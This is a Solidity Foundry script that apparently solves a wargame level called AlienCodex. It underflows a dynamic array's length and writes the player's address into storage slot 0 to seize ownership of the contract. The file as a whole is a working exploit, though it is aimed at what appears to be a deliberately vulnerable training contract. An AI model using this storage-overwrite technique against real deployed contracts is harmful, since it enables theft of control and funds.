import {Script, console} from "forge-std/Script.sol";

interface AlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        AlienCodex alienCodex = AlienCodex(0xa8BeA3A3AD8700647F581A79eC6e93a1A0E770A9);
        uint256 index = (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1;

        vm.startBroadcast(privateKey);

        alienCodex.makeContact();
        alienCodex.retract();
        alienCodex.revise(index, bytes32(uint256(uint160(player))));

        vm.stopBroadcast();
    }
}
